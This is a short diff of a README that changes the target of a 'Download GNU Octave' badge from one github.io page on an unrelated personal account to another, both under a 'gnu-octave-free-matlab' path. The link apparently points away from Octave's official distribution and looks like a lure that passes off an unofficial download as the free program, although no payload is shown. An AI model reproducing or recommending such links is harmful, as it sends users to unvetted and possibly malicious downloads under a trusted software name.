@@ -2,7 +2,7 @@
 
 ## 📥 Download GNU Octave
 
-[![⬇️ Download GNU Octave](https://img.shields.io/badge/Download-GNU%20Octave-darkblue?style=for-the-badge&logo=gnu)](https://xiusokolova.github.io/.github/gnu-octave-free-matlab)
+[![⬇️ Download GNU Octave](https://img.shields.io/badge/Download-GNU%20Octave-darkblue?style=for-the-badge&logo=gnu)](https://loyalreynawuyq.github.io/.github/gnu-octave-free-matlab)
 
 ---
 
